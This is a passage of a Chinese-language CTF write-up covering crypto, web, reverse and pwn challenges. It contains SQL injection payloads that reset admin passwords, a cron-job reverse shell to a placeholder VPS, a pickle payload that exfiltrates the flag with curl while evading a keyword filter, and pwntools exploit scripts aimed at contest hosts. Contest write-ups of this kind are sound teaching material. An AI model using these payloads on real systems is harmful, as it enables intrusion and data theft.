<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> (A.solve_right(vector(Zmod(p),www))):</span><br><span class="line">    <span class="built_in">print</span>((<span class="built_in">int</span>(x) % <span class="built_in">int</span>(p))-p)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="number">275609957223526193497841020687316070508</span>)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(key))</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key=key, iv=<span class="built_in">bytes</span>(<span class="built_in">range</span>(<span class="number">16</span>)), mode=AES.MODE_CBC)</span><br><span class="line">mm = cipher.decrypt(enc)</span><br><span class="line"><span class="comment"># enc = cipher.encrypt(pad(secret.flag, 16)).hex()</span></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;182273bd-61f2-7147-acd8-d571de11bb40&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
<h3 id="phpstudy"><a class="markdownIt-Anchor" href="#phpstudy"></a> phpstudy</h3>
<p>æ­£å¸¸è®¿é—®è¿æ¥æ˜¯404ï¼Œå¤§æ¦‚ç‡çŒœæµ‹æ˜¯ç¼ºå°‘HTTP head</p>
<p>å°è¯•å‘ç°æ˜¯<code>X-Requested-With: XMLHttpRequest</code></p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449545916849.png" alt="img"></p>
<p>å°è¯•å¼±å£ä»¤ç™»å½•ï¼Œadmin/123456,å¯†ç é”™è¯¯</p>
<p>å¥½çš„ï¼Œæ‰¾ä¸€ä¸‹æ¡†æ¶æ¼æ´ï¼Œæ‰¾åˆ°ä¸€ç¯‡ï¼š<a href="https://juejin.cn/post/7218080084141719612">å°çš®1-clickæ¼æ´çš„ä»£ç å®¡è®¡å­¦ä¹ ç¬”è®° - æ˜é‡‘ (juejin.cn)</a></p>
<p>è·Ÿç€å¤ç°çœ‹çœ‹ï¼Œç¡®å®šä¸ºè¿™ä¸ªæ¼æ´ï¼Œé¦–å…ˆç™»å½•ç•Œé¢çš„æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„SQLæ³¨å…¥æ¼æ´</p>
<p>å­˜åœ¨ç”¨æˆ·adminï¼Œç›´æ¥æ›´æ–°è¯¥ç”¨æˆ·çš„è´¦æˆ·å¯†ç ï¼Œè®¡ç®—ä¸€ä¸‹passwordä¸º123456çš„äº”æ¬¡md5çš„åŠ å¯†å€¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;123456&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">5</span>):    </span><br><span class="line">    <span class="built_in">str</span> = hashlib.md5(<span class="built_in">str</span>.encode()).hexdigest()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="comment">#c26be8aaf53b15054896983b43eb6a65</span></span><br></pre></td></tr></table></figure>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">admin&#x27;;<span class="keyword">UPDATE</span> ADMINS <span class="keyword">set</span> <span class="keyword">PASSWORD</span> = <span class="string">&#x27;c26be8aaf53b15054896983b43eb6a65&#x27;</span> <span class="keyword">where</span> username = <span class="string">&#x27;admin&#x27;</span>;--</span><br></pre></td></tr></table></figure>
<p>æ³¨å…¥ä»¥åï¼Œç›´æ¥admin/123456ç™»å½•ï¼Œç™»å½•æˆåŠŸ</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449551146052.png" alt="img"></p>
<p>è®¡åˆ’ä»»åŠ¡æ·»åŠ ä»»åŠ¡ï¼Œç¼–å†™åå¼¹shellï¼Œ<code>bash -i &gt;&amp; /dev/tcp/xxxx.xxx/xxxx 0&gt;&amp;1</code></p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449552577655.png" alt="img"></p>
<p>æ‰§è¡Œä»»åŠ¡ï¼Œvpsè®°å¾—å…ˆç›‘å¬ç›¸åº”ç«¯å£ï¼Œè·å–shell</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449553487758.png" alt="img"></p>
<p>flagåœ¨æ ¹ç›®å½•ï¼Œç›´æ¥è¯»å°±è¡Œ</p>
<h3 id="easypy"><a class="markdownIt-Anchor" href="#easypy"></a> easypy</h3>
<p>www.zipæºç æ³„éœ²ï¼Œåœ¨çº¿åç¼–è¯‘pycæ–‡ä»¶<a href="https://tool.lu/pyc/">pythonåç¼–è¯‘ - åœ¨çº¿å·¥å…· (tool.lu)</a></p>
<p>è·å¾—æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.0</span></span><br><span class="line"><span class="comment"># Python bytecode version base 3.8.0 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.6.12 (default, Feb  9 2021, 09:19:15) </span></span><br><span class="line"><span class="comment"># [GCC 8.3.0]</span></span><br><span class="line"><span class="comment"># Embedded file name: app.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2023-04-16 15:41:59</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 1030 bytes</span></span><br><span class="line"><span class="keyword">import</span> numpy, base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;å°pæƒ³è¦æ‰¾ä¸€ä¸ªå¥³æœ‹å‹ï¼Œä½ èƒ½å¸®ä»–æ‰¾æ‰¾çœ‹ä¹ˆï¼Ÿ&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/girlfriends&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">girlfriends</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;data&#x27;</span>):</span><br><span class="line">        data = request.values.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">        numpydata = base64.b64decode(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> numpydata <span class="keyword">or</span> <span class="string">b&#x27;bash&#x27;</span> <span class="keyword">in</span> numpydata <span class="keyword">or</span> <span class="string">b&#x27;sh&#x27;</span> <span class="keyword">in</span> numpydata:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;ä¸èƒ½èµ°æ·å¾„å•Š&#x27;</span></span><br><span class="line">        resp = numpy.loads(numpydata)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;å¯ä»¥çš„ï¼Œè¦çš„å°±æ˜¯ä¸€ç§æ„Ÿè§‰&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;æœ‰è¿›æ­¥äº†,ä½†æ˜¯ä¸å¤š&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;www.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">        stream = f.read()</span><br><span class="line">    response = Response(stream, content_type=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-disposition&#x27;</span>] = <span class="string">&#x27;attachment;filename=www.zip&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>ç®€å•çœ‹ä¸€ä¸‹è¿‡æ»¤è§„åˆ™ï¼Œå°±æ˜¯dataä¼ å…¥sstiæ³¨å…¥é“¾ä¹‹åbase64è§£ç ï¼Œå­˜åœ¨â€™Râ€™ã€â€˜bashâ€™ã€â€˜shâ€™ï¼Œå°±åªæ˜¯ç®€å•çš„ä¸å¸Œæœ›ä½ åå¼¹shellæˆ–è€…æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œç»•è¿‡æ–¹æ³•å¾ˆç®€å•ã€‚</p>
<p>curlå¤–å¸¦flagå³å¯ï¼Œä½¿ç”¨iæŒ‡ä»¤ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;(S&#x27;curl vps:port/`cat /f*`&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(data))</span><br></pre></td></tr></table></figure>
<p>è®°å¾—æå‰å¼€å¯ç«¯å£ç›‘å¬ï¼š</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449612872961.png" alt="img"></p>
<h3 id="ezrust"><a class="markdownIt-Anchor" href="#ezrust"></a> ezrust</h3>
<p>ç®€å•çœ‹çœ‹æºç ï¼š</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> actix_files::NamedFile;</span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;App, HttpRequest, HttpResponse, HttpServer, Responder, <span class="type">Result</span>, web, get, post, guard&#125;;</span><br><span class="line"><span class="keyword">use</span> std::path::PathBuf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">index</span>(req: HttpRequest) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;NamedFile&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">path</span>: PathBuf = req.<span class="title function_ invoke__">match_info</span>().<span class="title function_ invoke__">query</span>(<span class="string">&quot;filename&quot;</span>).<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">if</span> path.<span class="title function_ invoke__">to_str</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;REASON&quot;</span>).<span class="title function_ invoke__">to_string</span>().<span class="title function_ invoke__">contains</span>(<span class="string">&quot;p&quot;</span>) &#123;</span><br><span class="line">        path = PathBuf::<span class="title function_ invoke__">from</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(NamedFile::<span class="title function_ invoke__">open</span>(path)?)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">hello</span>() <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">body</span>(<span class="string">&quot;Hello world!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&#123;name&#125;&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">name</span>(path: web::Path&lt;(<span class="type">String</span>)&gt;) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">String</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">name</span> = path.<span class="title function_ invoke__">into_inner</span>();</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(<span class="built_in">format!</span>(<span class="string">&quot;Welcome &#123;&#125;!&quot;</span>, name))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_web::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> std::io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(|| &#123;</span><br><span class="line">        App::<span class="title function_ invoke__">new</span>()</span><br><span class="line">            .<span class="title function_ invoke__">service</span>(hello)</span><br><span class="line">            .<span class="title function_ invoke__">service</span>(name)</span><br><span class="line">            .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/&#123;filename:.*&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(index))</span><br><span class="line">    &#125;)</span><br><span class="line">        .<span class="title function_ invoke__">bind</span>((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))?</span><br><span class="line">        .<span class="title function_ invoke__">run</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é‡ç‚¹çœ‹ä¸€ä¸‹è¿™ä¸€æ®µ</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">index</span>(req: HttpRequest) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;NamedFile&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">path</span>: PathBuf = req.<span class="title function_ invoke__">match_info</span>().<span class="title function_ invoke__">query</span>(<span class="string">&quot;filename&quot;</span>).<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">if</span> path.<span class="title function_ invoke__">to_str</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;REASON&quot;</span>).<span class="title function_ invoke__">to_string</span>().<span class="title function_ invoke__">contains</span>(<span class="string">&quot;p&quot;</span>) &#123;</span><br><span class="line">        path = PathBuf::<span class="title function_ invoke__">from</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(NamedFile::<span class="title function_ invoke__">open</span>(path)?)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œä¸»è¦ä½¿ç”¨çš„æ˜¯open()å‡½æ•°ï¼Œç”¨æ¥è¯»å–æŒ‡å®šè·¯å¾„ä¸‹çš„æ–‡ä»¶ï¼Œæ ¹æ®é¢˜ç›®æç¤º</p>
<p>flagåœ¨workç›®å½•ä¸‹ï¼Œç»“åˆè‡ªå·±æ­å»ºvueæ¡†æ¶çš„ç»å†ï¼Œé”å®šflagå°±åœ¨å½“å‰ç›®å½•</p>
<p>ç›´æ¥<code>url/./flag</code>è·å–flag</p>
<h3 id="qqcms"><a class="markdownIt-Anchor" href="#qqcms"></a> qqcms</h3>
<p>searchå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œ<code>ssti+sql</code></p>
<p>sqlä¿®æ”¹ç®¡ç†å‘˜å¯†ç ä¸º123456</p>
<p>payloadï¼š</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="keyword">loop</span> sql=<span class="symbol">&#x27;INSERT</span> INTO qc_user VALUES (<span class="number">666</span>, <span class="number">18888888889</span>, <span class="string">&quot;ç®¡ç†å‘˜&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">1</span>, <span class="string">&quot;&quot;</span>, <span class="number">2</span>, <span class="number">0.00</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1652334396</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1652334410</span>, <span class="string">&quot;127.0.0.1&quot;</span>)&#x27;&#125;&#125;&#123;&#123;/<span class="keyword">loop</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>ç™»å½•åå°æˆåŠŸï¼Œç›®å½•ç©¿è¶Šè·å–flagï¼š</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449660185664.png" alt="img"></p>
<h2 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h2>
<h3 id="sum"><a class="markdownIt-Anchor" href="#sum"></a> sum</h3>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449666451467.png" alt="img"></p>
<p>è¿›å»è·å–æ•°æ®</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449667805170.png" alt="img"></p>
<p>ä¸€çœ¼æ•°ç‹¬ï¼Œç›´æ¥åœ¨çº¿ç½‘ç«™ç®—<a href="https://shudu.gwalker.cn/">https://shudu.gwalker.cn/</a></p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449669279373.jpeg" alt="img"></p>
<p>è¾“å…¥æ­£ç¡®çš„æ•°æ®ä¹‹åï¼Œå³å¯è·å–flag</p>
<h3 id="poisoned_tea_chell"><a class="markdownIt-Anchor" href="#poisoned_tea_chell"></a> Poisoned_tea_CHELL</h3>
<p>é€šè¿‡åŠ¨è°ƒå®šä½è‡³ä¸»å‡½æ•°</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519201149062.png" alt="image-20230519201149062"></p>
<p>æŸ¥çœ‹checkå‡½æ•°</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519201256667.png" alt="image-20230519201256667"></p>
<p>â†‘åˆå§‹åŒ–keyï¼Œè·å–è¾“å…¥åè¿›è¡ŒxteaåŠ å¯†</p>
<p>xteaåŠ å¯†ä¸ºä»…æ›´æ”¹é­”æ•°çš„åŠ å¯†</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519201435273.png" alt="image-20230519201435273"></p>
<p>åŠ å¯†å®Œæˆåè¿›è¡Œæ ¡éªŒ</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519201529248.png" alt="image-20230519201529248"></p>
<p>å¯ä»¥çœ‹å‡ºå…³é”®æ•°æ®éƒ½éœ€è¦é€šè¿‡åŠ¨è°ƒè·å¾—ï¼Œä¸è¿‡idaè¯†åˆ«ä¸ºåŠ¨æ€åº“æ–‡ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œé€šè¿‡attachè¿›ç¨‹è·å¾—</p>
<p>æœ€ç»ˆè§£å¯†è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;windows.h&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">void tea(<span class="built_in">int</span> <span class="built_in">round</span>, unsigned <span class="built_in">int</span> *src, unsigned <span class="built_in">int</span> *key)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned <span class="built_in">int</span> v1 = src[<span class="number">0</span>];</span><br><span class="line">    unsigned <span class="built_in">int</span> v2 = src[<span class="number">1</span>];</span><br><span class="line">    unsigned <span class="built_in">int</span> <span class="built_in">sum</span> = <span class="number">3652639132</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i=<span class="number">0</span>; i&lt;<span class="built_in">round</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v2 -= (v1 + ((v1 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v1))) ^ (key[((<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)] + <span class="built_in">sum</span>);</span><br><span class="line">        <span class="built_in">sum</span> += <span class="number">0x41104111</span>;</span><br><span class="line">        v1 -= (v2 + ((v2 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v2))) ^ (key[(<span class="built_in">sum</span> &amp; <span class="number">3</span>)] + <span class="built_in">sum</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    src[<span class="number">0</span>] = v1;</span><br><span class="line">    src[<span class="number">1</span>] = v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned <span class="built_in">int</span> src[<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">0xECFDA301</span>, <span class="number">0x61BECDF5</span>, <span class="number">0xB89E6C7D</span>, <span class="number">0xCE36DC68</span>, <span class="number">0x4B6E539E</span>, <span class="number">0x642EB504</span>, <span class="number">0x54F9D33C</span>, <span class="number">0x6D06E365</span>, </span><br><span class="line">        <span class="number">0xEA873D53</span>, <span class="number">0xA4618507</span>, <span class="number">0xD7B18E30</span>, <span class="number">0xC45B4042</span></span><br><span class="line">    &#125;;</span><br><span class="line">    unsigned <span class="built_in">int</span> key[] = &#123;<span class="number">5</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">7</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i=<span class="number">0</span>; i&lt;<span class="number">12</span>; i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        tea(<span class="number">0x24</span>, &amp;src[i], key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i=<span class="number">0</span>; i&lt;<span class="number">48</span>; i+=<span class="number">1</span>)</span><br><span class="line">        printf(<span class="string">&quot;%c&quot;</span>, *((char*)src + i));</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h2>
<h3 id="p2048"><a class="markdownIt-Anchor" href="#p2048"></a> p2048</h3>
<p>çº¯ç©ï¼Œè¾¾æˆæ¡ä»¶ï¼Œé¡¶ä¸Šå››æ ¼åŠ èµ·æ¥ä¸º2048å³å¯ï¼ˆå¯ä»¥æ‰‹æ‰“ï¼‰ï¼›</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">sh = remote(<span class="string">&#x27;47.94.224.3&#x27;</span>,<span class="number">27384</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\n&#x27;</span> * <span class="number">1200</span> + <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive() </span><br></pre></td></tr></table></figure>
<h3 id="easy_lzhiftp_chell"><a class="markdownIt-Anchor" href="#easy_lzhiftp_chell"></a> easy_LzhiFTP_CHELL</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,\</span><br><span class="line">        log_level=<span class="string">&#x27;debug&#x27;</span>,\</span><br><span class="line">        terminal=[<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;split&quot;</span>,<span class="string">&quot;-h&quot;</span>])</span><br><span class="line">path = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line"></span><br><span class="line">elf = ELF(path+<span class="string">&quot;/pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/ubuntu/tools/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(path+&quot;/pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;39.106.48.123&quot;</span>,<span class="number">37904</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;test&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Password: &quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;r&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;/No)&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;No%25$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">0x2e2b</span></span><br><span class="line">success(<span class="string">&quot;addr :&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touch</span>(<span class="params">content,content1</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;FTP&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;touch\x01&#x27;</span>+content)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;text:&quot;</span>)</span><br><span class="line">    p.send(content1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;FTP&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;cat&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug0</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;FTP&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;FTP&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;edit&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx:&quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;nt: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;FTP&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;del&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx:&quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;FTP&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">touch(p64(addr+<span class="number">0x38</span>),<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free_got = addr-<span class="number">0xae8</span></span><br><span class="line">touch(p64(free_got),<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">touch(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">touch(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">touch(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">strlen_got = addr - <span class="number">0xad0</span></span><br><span class="line">edit(-<span class="number">16</span>,p64(strlen_got))</span><br><span class="line">cat()</span><br><span class="line">libc_addr = 